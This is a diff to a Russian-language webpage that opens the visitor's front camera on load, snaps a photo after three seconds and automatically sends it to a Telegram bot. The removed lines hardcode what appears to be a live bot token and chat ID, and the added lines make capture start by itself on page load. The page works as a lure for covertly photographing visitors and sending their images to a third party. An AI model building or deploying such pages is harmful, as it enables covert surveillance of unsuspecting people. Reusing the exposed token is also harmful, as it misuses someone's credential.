@@ -3,34 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Сделать фото и отправить</title>
+    <title>Сделать фото</title>
 </head>
 <body>
     <video id="video" autoplay></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const TELEGRAM_BOT_TOKEN = "7992994740:AAGwalP97X8BFhuHYArApCUJS5-NeQV-Sr0";  // <-- Вставьте новый токен
-        const CHAT_ID = "621679070";  // <-- Вставьте ваш Chat ID
+        const TELEGRAM_BOT_TOKEN = "ВАШ_ТОКЕН_БОТА";  
+        const CHAT_ID = "ВАШ_CHAT_ID";  
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
 
-        // Запрашиваем доступ к камере
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
-                setTimeout(takePhoto, 3000);  // Делаем фото через 3 секунды
-            })
-            .catch(error => console.error("Ошибка доступа к камере", error));
+                setTimeout(takePhoto, 3000);  
+            } catch (error) {
+                alert("Ошибка доступа к камере: " + error);
+            }
+        }
 
         function takePhoto() {
+            if (video.videoWidth === 0 || video.videoHeight === 0) {
+                alert("Камера не активирована!");
+                return;
+            }
+
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            // Конвертируем изображение в Blob и отправляем в Telegram
             canvas.toBlob(blob => {
                 let formData = new FormData();
                 formData.append("chat_id", CHAT_ID);
@@ -39,10 +45,12 @@
                 fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                     method: "POST",
                     body: formData
-                }).then(response => console.log("Фото отправлено!"))
-                  .catch(error => console.error("Ошибка отправки фото", error));
+                }).then(response => alert("✅ Фото отправлено в Telegram!"))
+                  .catch(error => alert("❌ Ошибка отправки фото! " + error));
             }, "image/png");
         }
+
+        window.onload = startCamera;  
     </script>
 </body>
 </html>
